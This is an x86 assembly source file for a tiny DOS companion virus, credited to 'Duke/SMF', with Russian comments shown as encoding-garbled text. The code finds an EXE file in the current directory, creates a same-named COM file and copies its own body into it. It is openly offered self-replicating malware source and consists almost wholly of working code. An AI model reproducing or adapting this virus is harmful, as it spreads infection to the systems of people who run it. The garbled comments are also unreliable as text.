   ;*ë«®  : C.39 by Duke/SMF  (23.05.99)
   ;‘â «® : C.38 by Duke/SMF

   ;…á«¨ ¢ â¥ªãé¥¬ ª â «®£¥ ¥áâì EXE-ä ©« (¯¥à¢ë©, ¥á«¨ ¨å ¬®£®),
   ;¨ ã ¥£® ¥â ®¤®¨¬¥®£® COM, â® ¯®à §¨¬ (á®§¤ ¤¨¬ COM) ¨ ®â¢ «¨¬.
   ;“¯à ¢«¥¨ï ¥ ¢®§¢à é ¥¬, ¨ç¥àâ  ¥ ¯à®¢¥àï¥¬ :)
   ;Œ®¨ ª®¬¬¥â à¨¨ ®â¬¥ç¥ë "FD"
   ; tasm comp38.asm /m
   ; tlink comp38.obj /t

   ; *ã § £«îç¨«® ¬¥ï á íâ¨¬ ADD, çâ® ¯®¤¥« ¥èì...
   ; ’¥¯¥àì ¨á¯à ¢«ïî !

   .Model Tiny
   .code
   .386
   org 100h
   start:
   E_Mask db '*.e*'
   ;       mov  di,9eh
          xchg cx,ax              ;cx=0
          mov  ah,4eh

          CALL NewFile

   NewFile:
          mov dx,si
          int 21h

   ;TestFile:
   ;       mov dx,di
          mov dx,9eh         ;FD : áà §ã ¢ç¥å«¨¬ áî¤ 
          mov ax,5b2eh
   @1:
          scasb
          jne @1
          mov dword ptr [di],' moc'
          int 21h
   ;       jc @Exit          ;FD : ª®£¤  ¯à¨¤¥â ¢à¥¬ï ¢á¥ à ¢® á ¬¨ ¢ë©¤¥¬ ;-))
          xchg bx,ax
          mov ah,40h
          mov cl,MyLength    ;FD : ¨ ª ª®£® ç¥àâ  ï à ìè¥ ADD ¨á¯®«ì§®¢ « ???
   ;@Exit:
          ret
   ;---
   MyLength equ $-start
   end start
